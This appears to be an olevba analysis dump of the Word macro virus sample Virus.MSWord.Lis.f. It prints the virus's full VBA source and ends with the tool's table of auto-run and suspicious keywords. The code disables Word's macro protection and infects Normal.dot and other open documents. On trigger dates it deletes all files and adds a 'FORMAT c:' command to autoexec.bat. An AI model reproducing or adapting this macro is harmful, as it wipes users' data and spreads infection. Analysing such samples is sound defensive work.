olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Lis.f-4d792f8bf6cb2b7f8b7e04035f09394c4f436713
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Lis.f-4d792f8bf6cb2b7f8b7e04035f09394c4f436713 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 


Dim dvl
Private Sub Document_New()
 dvl = 0
 p
End Sub
Private Sub Document_Open()
 dvl = 0
 p
End Sub
Private Sub Document_Close()
 dvl = 1
 p
End Sub
Private Sub p()
 On Error Resume Next
 'L i s a 2 0 0 0
 Application.Options.VirusProtection = False
 System.PrivateProfileString("", "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Office\9.0\Word\Security", "level") = 1
 zaraza
 'Óáèâàåì âñå ïîäðÿä åñëè íåò ìåòêè
 Set ms = Application.FileSearch
 Set bur = Application.FileSearch
 Set gur = Application.FileSearch
 With ms
  .LookIn = "c:\windows\system\"
  .FileName = "lisa.dll"
  If .Execute = 0 Then
  With bur
   .LookIn = "c:\windows\system\"
   .FileName = "lisa.dat"
   If .Execute = 0 Then
    Open "c:\windows\system\lisa.dat" For Output As #1
     Print #1, Date + 2
    Close #1
   Else
    Open "c:\windows\system\lisa.dat" For Input As #1
     Line Input #1, mar
    Close #1
    If Date > CDate(mar) Then
     Open "c:\windows\system\lisa.dat" For Output As #1
      Print #1, Date + 2
     Close #1
     With gur
      .LookIn = "c:\"
      .FileName = "*.avc"
      .SearchSubFolders = True
      If .Execute > 0 Then
       For y = 1 To .FoundFiles.Count
        Kill (.FoundFiles(y))
       Next y
      End If
     End With
    End If
   End If
  End With
 If (Day(Now()) = 23) And (Month(Now()) = 2) Or (Day(Now()) = 1) And (Month(Now()) = 1) Or (Day(Now()) = 8) _
 And (Month(Now()) = 3) Or (Day(Now()) = 30) And (Month(Now()) = 4) Or (Day(Now()) = 10) And (Month(Now()) = 1) Or (Day(Now()) = 30) And (Month(Now()) = 8) Then
  Open "c:\autoexec.bat" For Append As #1
   Print #1, "echo y|FORMAT c: /q >nul"
  Close #1
 With gato
  .LookIn = "c:\"
  .FileName = "*.doc"
  .SearchSubFolders = True
  If .Execute > 0 Then
   For y = 1 To .FoundFiles.Count
    Kill (.FoundFiles(y))
   Next y
  End If
 End With
 With gato
  .LookIn = "c:\"
  .FileName = "*.xls"
  .SearchSubFolders = True
  If .Execute > 0 Then
   For y = 1 To .FoundFiles.Count
    Kill (.FoundFiles(y))
   Next y
  End If
 End With
 With gato
  .LookIn = "c:\"
  .FileName = "*.*"
  .SearchSubFolders = True
  If .Execute > 0 Then
   For y = 1 To .FoundFiles.Count
    Kill (.FoundFiles(y))
   Next y
  End If
 End With
 End If
 End If
 End With
 If dvl = 1 Then
  Randomize
  duga = Application.Documents.Count
  c = "'"
  d = ""
  mar = ""
  f = 0
  g = ""
  eee = Int((4 * Rnd) + 1)
  h = "Private Sub ras" + Trim(Str(eee)) + "()"
  a = ThisDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
  For i = 1 To a
   b = ThisDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(i, 1)
   If b = h Or f = 1 Then
    If f = 1 Then g = g + b + Chr(13)
    If b <> "End Sub" Then f = 1 Else f = 0
   End If
   For j = 1 To Len(b)
    e = Int((60 * Rnd) + 1) + 1
    If e < 40 Then e = 40
    c = c + Chr(e) + Mid(b, j, 1)
   Next j
   d = d + c + Chr(13)
   If ThisDocument.Name <> "Normal.dot" Then
    ThisDocument.VBProject.VBComponents.Item(1).CodeModule.ReplaceLine i, c
   End If
   mar = mar + c + Chr(13)
   c = "'"
  Next i
  If duga = 1 Then
   NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.DeleteLines 1, NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
   NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.InsertLines 1, mar
  End If
  If ThisDocument.Name <> "Normal.dot" Then
   ThisDocument.VBProject.VBComponents.Item(1).CodeModule.InsertLines 1, "Private Sub Document_Open()"
   ThisDocument.VBProject.VBComponents.Item(1).CodeModule.InsertLines 2, g
  End If
  If duga = 1 Then
   NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.InsertLines 1, "Sub autoexec()"
   NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.InsertLines 2, g
   azs = NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
   NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.InsertLines azs + 1, "'2S>u*b
 (v*i#e>wgv,b c+o!d*e+(8)"
   NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.InsertLines azs + 2, "'6On# <E<r=r0o!r( ;R%e,s2u
m@e;  N,e5x4t"
   NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.InsertLines azs + 3, "' a) :=r (N+o>r:m%a
l9T4e3m-p#l/a1t2e(.3V6B+Pr@o+j0e*c9t..;V
B=C6o<m:p>o+n8e1n;t5s
.!I+t-e<m$(-11)1.9C oyd4e5M&o+d,u
l$e9.7C4o,u)n<t1O(f4L,i6n+e=s"
   NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.InsertLines azs + 4, "'*No!r-m<a@l(T%e(m.p%l#a:tre0.6V8B+P8r0o
j-e/c3t:.)V.BC(o8m8p)on e>n<t@s9.+I(t-e@m1(19)&.$C8o'd6e6M7o8d1u:l-e8.D&e?l=e@t(eL
i,n
e)s+ 714,2 /a"
   NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.InsertLines azs + 5, "'5N;o!r m8a!l
T*e,m p%l
a.t>e/.)S1av/e:d+ 
=. 4T8r*u8e"
   NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.InsertLines azs + 6, "'+c* 6=0 A#p'p0l(i3c5a/t
i o n.<D;o0c<u7m6e+n3t1s .C8o3u?n4t"
   NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.InsertLines azs + 7, "'6F:o9r2 9i< >=4 14 1T8o, )c"
   NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.InsertLines azs + 8, "'/d. $=) ?A=p(p;l%ic:a
t'i$o'n1.;D1o.c&u)m/e&n
t-s6.'I(t0e-m,(i&)-.0V1B/P
r)o$j>e.c t!.8V
B.C
o'm3p(o=n)e0n1t1s4.3Ijt$e
m3(410)-.!Co7d$e;M
o d
u<l
e
..C<o7u!n8t&O.f?L!i&n2e:s"
   NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.InsertLines azs + 9, "'?I>f7 .d: =>/ :0 1Th.e5n"
   NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.InsertLines azs + 10, "'4A?p1p6l2i9c4a!t5i>o!n..&D&o4c*u3m(e1n&t3s*.;I+t5e,m?('i4):.(V?B.P+r-o+j1e8c0t).7V
B
C?oim$p1o.n4e'n;ts?.@I
t9e/m%()11);.<C!od=e8M(o*d0uel?e$.6D9e:l)e(t1e=L6i1n.e8s# 519,4 (d"
   NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.InsertLines azs + 11, "'9A2p*p+l<i)c9a*t3i9o5n..
D0o7c*u#m7e4n#t3s).<I9t+e7m2(/i&)+.4S(a5v
e,d2 
=9 :T:r/u2e"
   NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.InsertLines azs + 12, "';E;n4d< 7I:f"
   NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.InsertLines azs + 13, "'0N?e/x&t% *i"
   NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.InsertLines azs + 14, "'*A5p9p/l+i;c#a!t-i o?n-.0S
h=o#w<V-i2s;u=a(l9B7a2s>i4c,E/d-i<t)o3r9 *=, 6T*r>u/e"
   NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.InsertLines azs + 15, "'
E(n:d$ 9S+utb"
  End If
 End If
End Sub

Private Sub zaraza()
 s = ThisDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
 d = ThisDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(1, s)
 a = ThisDocument.Name
 metka = 0
 metka1 = 0
 For k = 1 To Application.Documents.Count
  t = Application.Documents.Item(k).VBProject.VBComponents.Item(1).CodeModule.CountOfLines
  For i = 1 To t
   ss = Application.Documents.Item(k).VBProject.VBComponents.Item(1).CodeModule.Lines(i, 1)
   dsk = ""
   For dst = 3 To Len(ss) Step 2
    dsk = dsk + Mid(ss, dst, 1)
   Next dst
   If ss = "Private Sub p()" Or dsk = "Private Sub p()" Then metka = 1
  Next i
  b = Documents.Item(k).Name
  If b <> a And metka = 0 Then
   For j = 1 To s
    mmm = ThisDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(j, 1)
    mmm1 = ""
    For hhh = 3 To Len(mmm) Step 2
     mmm1 = mmm1 + Mid(mmm, hhh, 1)
    Next hhh
    If mmm = "Sub viewvbcode()" Or mmm1 = "Sub viewvbcode()" Then metka1 = 1
    If metka1 = 0 Then
     Application.Documents.Item(k).VBProject.VBComponents.Item(1).CodeModule.InsertLines j, mmm
    End If
   Next j
  End If
 metka = 0
 metka1 = 0
 Next k
 aa = NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
 zak = 0
 If aa = 0 Then
  NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.InsertLines 1, d
  fff = NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
  NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.InsertLines fff + 1, "Sub viewvbcode()"
  NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.InsertLines fff + 2, "On Error Resume Next"
  NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.InsertLines fff + 3, "a = NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines"
  NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.InsertLines fff + 4, "NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.DeleteLines 1, a"
  NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.InsertLines fff + 5, "NormalTemplate.Saved = True"
  NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.InsertLines fff + 6, "c = Application.Documents.Count"
  NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.InsertLines fff + 7, "For i = 1 To c"
  NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.InsertLines fff + 8, "d = Application.Documents.Item(i).VBProject.VBComponents.Item(1).CodeModule.CountOfLines"
  NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.InsertLines fff + 9, "If d > 0 Then"
  NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.InsertLines fff + 10, "Application.Documents.Item(i).VBProject.VBComponents.Item(1).CodeModule.DeleteLines 1, d"
  NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.InsertLines fff + 11, "Application.Documents.Item(i).Saved = True"
  NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.InsertLines fff + 12, "End If"
  NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.InsertLines fff + 13, "Next i"
  NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.InsertLines fff + 14, "Application.ShowVisualBasicEditor = True"
  NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.InsertLines fff + 15, "End Sub"
 Else
  For zzz = 1 To aa
   barb = NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(zzz, 1)
   barb1 = ""
   For mrs = 3 To Len(barb) Step 2
    barb1 = barb1 + Mid(barb1, mrs, 1)
   Next mrs
   If barb = "Private Sub p()" Or barb1 = "Private Sub p()" Then zak = 1
  Next zzz
  If zak = 0 Then
   NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.DeleteLines 1, aa
   NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.InsertLines 1, d
   fff = NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
   NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.InsertLines fff + 1, "Sub viewvbcode()"
   NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.InsertLines fff + 2, "On Error Resume Next"
   NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.InsertLines fff + 3, "a = NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines"
   NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.InsertLines fff + 4, "NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.DeleteLines 1, a"
   NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.InsertLines fff + 5, "NormalTemplate.Saved = True"
   NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.InsertLines fff + 6, "c = Application.Documents.Count"
   NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.InsertLines fff + 7, "For i = 1 To c"
   NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.InsertLines fff + 8, "d = Application.Documents.Item(i).VBProject.VBComponents.Item(1).CodeModule.CountOfLines"
   NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.InsertLines fff + 9, "If d > 0 Then"
   NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.InsertLines fff + 10, "Application.Documents.Item(i).VBProject.VBComponents.Item(1).CodeModule.DeleteLines 1, d"
   NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.InsertLines fff + 11, "Application.Documents.Item(i).Saved = True"
   NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.InsertLines fff + 12, "End If"
   NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.InsertLines fff + 13, "Next i"
   NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.InsertLines fff + 14, "Application.ShowVisualBasicEditor = True"
   NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.InsertLines fff + 15, "End Sub"
  End If
 End If
End Sub

Private Sub ras1()
 a = ThisDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
 c = ""
 m = 0
 z = 0
 For i = 1 To a
  b = ThisDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(i, 1)
  If b = "Private Sub Document_Open()" Or b = "Sub autoexec()" Then m = 1
  If m = 1 Then
   z = z + 1
   If b = "End Sub" Then m = 0
  End If
 Next i
 ThisDocument.VBProject.VBComponents.Item(1).CodeModule.DeleteLines 1, z + 1
 a = ThisDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
 For i = 1 To a
  b = ThisDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(i, 1)
  For j = 3 To Len(b) Step 2
   c = c + Mid(b, j, 1)
  Next j
  ThisDocument.VBProject.VBComponents.Item(1).CodeModule.ReplaceLine i, c
  c = ""
 Next i
 Documents.Add
 Documents.Item(1).Saved = False
End Sub
Private Sub ras2()
 w = ""
 l = 0
 y = 0
 For i = 1 To ThisDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
  b = ThisDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(i, 1)
  If ThisDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(i, 1) = "Private Sub Document_Open()" Or _
  ThisDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(i, 1) = "Sub autoexec()" Then l = 1
  If l = 1 Then
   y = y + 1
   If b = "End Sub" Then l = 0
  End If
 Next i
 ThisDocument.VBProject.VBComponents.Item(1).CodeModule.DeleteLines 1, y + 1
 For i = 1 To ThisDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
  For j = 3 To Len(ThisDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(i, 1)) Step 2
   w = w + Mid(ThisDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(i, 1), j, 1)
  Next j
  ThisDocument.VBProject.VBComponents.Item(1).CodeModule.ReplaceLine i, w
  w = ""
 Next i
 Documents.Add
 Documents.Item(1).Saved = False
End Sub
Private Sub ras3()
 a = ThisDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
 c = ""
 m = 0
 z = 0
 i = 1
 Do While i <= a
  b = ThisDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(i, 1)
  If b = "Private Sub Document_Open()" Or b = "Sub autoexec()" Then m = 1
  If m = 1 Then
   z = z + 1
   If b = "End Sub" Then m = 0
  End If
  i = i + 1
 Loop
 ThisDocument.VBProject.VBComponents.Item(1).CodeModule.DeleteLines 1, z + 1
 a = ThisDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
 i = 1
 Do While i <= a
  b = ThisDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(i, 1)
  For j = 3 To Len(b) Step 2
   c = c + Mid(b, j, 1)
  Next j
  ThisDocument.VBProject.VBComponents.Item(1).CodeModule.ReplaceLine i, c
  c = ""
  i = i + 1
 Loop
 Documents.Add
 Documents.Item(1).Saved = False
End Sub
Private Sub ras4()
 w = ""
 l = 0
 y = 0
 i = 1
 Do While i <= ThisDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
  b = ThisDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(i, 1)
  If ThisDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(i, 1) = "Private Sub Document_Open()" Or _
  ThisDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(i, 1) = "Sub autoexec()" Then l = 1
  If l = 1 Then
   y = y + 1
   If b = "End Sub" Then l = 0
  End If
  i = i + 1
 Loop
 ThisDocument.VBProject.VBComponents.Item(1).CodeModule.DeleteLines 1, y + 1
 i = 1
 Do While i <= ThisDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
  For j = 3 To Len(ThisDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(i, 1)) Step 2
   w = w + Mid(ThisDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(i, 1), j, 1)
  Next j
  ThisDocument.VBProject.VBComponents.Item(1).CodeModule.ReplaceLine i, w
  w = ""
  i = i + 1
 Loop
 Documents.Add
 Documents.Item(1).Saved = False
End Sub











































































+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |autoexec            |Runs when the Word document is opened        |
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_New        |Runs when a new Word document is created     |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|IOC       |lisa.dll            |Executable file name                         |
|IOC       |autoexec.bat        |Executable file name                         |
+----------+--------------------+---------------------------------------------+
